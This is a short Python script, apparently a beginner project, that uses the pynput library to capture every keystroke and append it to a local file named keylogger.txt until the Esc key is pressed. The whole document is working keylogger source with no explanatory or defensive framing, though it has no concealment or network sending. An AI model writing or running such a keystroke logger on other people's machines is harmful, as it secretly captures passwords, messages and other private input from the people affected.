from pynput import keyboard

def on_press(key):
    try:
        with open("keylogger.txt","a") as f:
            f.write(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            with open("keylogger.txt","a") as f:
                f.write("keyboard.Key.space")


def on_release(key):
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()